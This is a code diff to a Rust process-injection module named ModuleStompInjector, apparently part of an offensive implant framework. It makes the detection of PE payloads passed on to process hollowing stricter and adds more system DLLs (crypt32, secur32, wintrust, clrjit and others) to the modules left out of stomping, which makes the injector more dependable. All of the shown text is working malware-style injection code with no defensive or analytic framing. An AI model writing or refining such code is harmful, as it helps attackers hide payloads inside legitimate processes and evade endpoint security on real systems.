@@ -1,4 +1,4 @@
-use crate::injection::Injector;
+use crate::injection::{payload_has_valid_pe_headers, Injector};
 use anyhow::{anyhow, Result};
 
 pub struct ModuleStompInjector;
@@ -20,7 +20,7 @@ impl Injector for ModuleStompInjector {
             PROCESS_VM_READ, PROCESS_VM_WRITE,
         };
 
-        let is_pe = payload.len() >= 2 && payload[0] == b'M' && payload[1] == b'Z';
+        let is_pe = payload_has_valid_pe_headers(payload);
         if is_pe {
             log::info!(
                 "PE payload detected, forwarding to process hollowing's inject_into_process"
@@ -165,6 +165,13 @@ impl Injector for ModuleStompInjector {
                     let is_excluded = lname.starts_with("ntdll")
                         || lname.starts_with("kernel32")
                         || lname.starts_with("kernelbase")
+                        || lname.starts_with("crypt32")
+                        || lname.starts_with("dbghelp")
+                        || lname.starts_with("version")
+                        || lname.starts_with("secur32")
+                        || lname.starts_with("wintrust")
+                        || lname.starts_with("mscoree")
+                        || lname.starts_with("clrjit")
                         || lname.starts_with("agent")
                         || lname.len() < 5;
 
